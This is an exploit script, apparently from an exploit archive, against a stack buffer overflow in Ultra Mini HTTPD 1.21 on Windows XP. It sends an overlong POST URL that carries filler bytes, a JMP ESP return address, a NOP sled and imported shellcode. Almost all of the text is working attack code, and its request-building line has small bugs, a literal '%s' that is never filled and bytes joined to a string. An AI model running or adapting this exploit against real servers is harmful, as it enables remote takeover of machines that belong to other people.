# Exploit Title: Ultra Mini HTTPD stack buffer overflow POST request
# Date: 16 Feb 2014
# Exploit Author: Sumit
# Vendor Homepage: http://www.picolix.jp/
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Version: 1.21
# Tested on: Windows XP Professional SP3
#
# Description:
# A buffer overflow is triggered when requesting a very long url in POST request
#

import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):
    try:
        EIP = b'\x53\x93\x42\x7E' # 7E429353 JMP ESP user.dll
        payload = b'A'* 5438 + EIP + b'\x90'*50 + buf

        
        buffer = b"POST / %s HTTP/1.1\r\nHost:"+target_machine+b"\r\n\r\n" + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_machine, target_port))
        s.send(buffer)
        s.close()
    except:
        print("Not Connected")    